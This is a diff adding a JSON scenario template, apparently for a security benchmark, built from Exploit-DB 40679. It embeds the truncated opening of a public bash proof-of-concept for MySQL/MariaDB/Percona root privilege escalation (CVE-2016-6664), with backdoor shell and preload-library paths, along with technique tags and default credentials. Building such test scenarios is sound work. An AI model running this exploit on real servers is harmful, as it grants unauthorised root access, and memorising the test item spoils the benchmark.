@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_40679",
+  "category": "D3_database",
+  "attack_technique": "T1078.003",
+  "cwe": "CWE-269",
+  "description": "Linux privilege escalation: MySQL / MariaDB / PerconaDB 5.5.x/5.6.x/5.7.x - 'root' System User Privilege Escalation (CVE-2016-6664;CVE-2016-5617)\n\nExploit source code (40679.sh):\n```\n#!/bin/bash -p\n#\n# Source: https://legalhackers.com/advisories/MySQL-Maria-Percona-RootPrivEsc-CVE-2016-6664-5617-Exploit.html // http://legalhackers.com/exploits/CVE-2016-6664/mysql-chowned.sh\n#\n# MySQL / MariaDB / PerconaDB - Root Privilege Escalation PoC Exploit\n# mysql-chowned.sh (ver. 1.0)\n#\n# CVE-2016-6664 / OCVE-2016-5617\n#\n# Discovered and coded by:\n#\n# Dawid Golunski\n# dawid[at]legalhackers.com\n#\n# https://legalhackers.com\n#\n# Follow https://twitter.com/dawid_golunski for updates on this advisory.\n#\n# This PoC exploit allows attackers to (instantly) escalate their privileges\n# from mysql system account to root through unsafe error log handling.\n# The exploit requires that file-based logging has been configured (default).\n# To confirm that syslog logging has not been enabled instead use:\n# grep -r syslog /etc/mysql\n# which should return no results.\n#\n# This exploit can be chained with the following vulnerability:\n# CVE-2016-6663 / OCVE-2016-5616\n# which allows attackers to gain access to mysql system account (mysql shell).\n#\n# In case database server has been configured with syslog you may also use:\n# CVE-2016-6662 as an alternative to this exploit.\n#\n# Usage:\n# ./mysql-chowned.sh path_to_error.log\n#\n#\n# See the full advisory for details at:\n# https://legalhackers.com/advisories/MySQL-Maria-Percona-RootPrivEsc-CVE-2016-6664-5617-Exploit.html\n#\n# Video PoC:\n# https://legalhackers.com/videos/MySQL-MariaDB-PerconaDB-PrivEsc-Race-CVE-2016-6663-5616-6664-5617-Exploits.html\n#\n#\n# Disclaimer:\n# For testing purposes only. Do no harm.\n#\n\nBACKDOORSH=\"/bin/bash\"\nBACKDOORPATH=\"/tmp/mysqlrootsh\"\nPRIVESCLIB=\"/tmp/privesclib.so\"\nPRIVESCSRC=\"/tmp/privesclib.c\"\nSUIDBIN=\"/usr/bin/sudo\"\n\nfunction cleanexit {\n\t# Cleanup\n\techo -e \"\\n[+] Cleaning up...\"\n\trm -f $PRIVESCSRC\n\trm -f $PRIVESCLIB\n\trm -f $ERRORLOG\n\ttouch $ERRORLOG\n\tif [ -f /etc/ld.so.preload ]; then\n\t\techo -n > /etc/ld.so.preload\n\tfi\n\techo -e \"\\n[+] Job done. Exiting with code $1 \\n\"\n\texit $1\n}\n\nfunction ctrl_c() {\n        echo -e \"\\n[+] Active exploitation aborted. Remember you can use -deferred switch for deferred exploitation.\"\n\tcleanexit 0\n}\n\n#intro\necho -e \"\\033[94m \\nMySQL / MariaDB / PerconaDB - Root Privilege Escalation PoC Exploit \\nmysql-chowned.sh (ver. 1.0)\\n\\nCVE-2016-6664 / OCVE-2016-5617\\n\"\necho -e \"Discovered and coded by: \\n\\nDawid Golunski \\nhttp://legalhackers.com \\033[0m\"\n\n# Args\nif [ $# -lt 1 ]; then\n\techo -e \"\\n[!] Exploit usage: \\n\\n$0 path_to_error.log \\n\"\n\techo -e \"It seems that this server uses: `ps aux | grep mysql | awk -F'log-error=' '{ print $2 }' | cut -d' ' -f1 | grep '/'`\\n\"\n\texit 3\nfi\n\n# Priv check\n\necho -e \"\\n[+] Starting the exploit as \\n\\033[94m`id`\\033[0m\"\nid | grep -q mysql\nif [ $? -ne 0 ]; then\n\techo -e \"\\n[!] You need to execute the exploit as mysql user! Exiting.\\n\"\n\texit 3\nfi\n\n# Set target paths\nERRORLOG=\"$1\"\nif [ ! -f $ERRORLOG ]; then\n\techo -e \"\\n[!] The specified MySQL catalina.out log ($ERRORLOG) doesn't exist. Try again.\\n\"\n\texit 3\nfi\necho -e \"\\n[+] Tar\n```",
+  "cve": "CVE-2016-6664;CVE-2016-5617",
+  "exploitdb_id": "40679",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_40679",
+      "type": "core",
+      "difficulty": "hard"
+    }
+  ]
+}
